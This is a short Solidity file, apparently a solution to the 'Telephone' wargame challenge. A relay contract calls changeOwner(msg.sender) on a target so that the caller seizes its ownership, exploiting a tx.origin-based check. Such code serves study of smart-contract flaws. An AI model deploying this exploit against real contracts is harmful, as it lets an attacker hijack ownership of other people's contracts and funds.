```
pragma solidity ^0.4.24;

contract Telephone {
    function changeOwner(address _owner) public;
}

contract TelephoneCaller {
    function callTelephone(address coinContract) public {
        Telephone contractToCall = Telephone(coinContract);
        contractToCall.changeOwner(msg.sender);
    }
}
```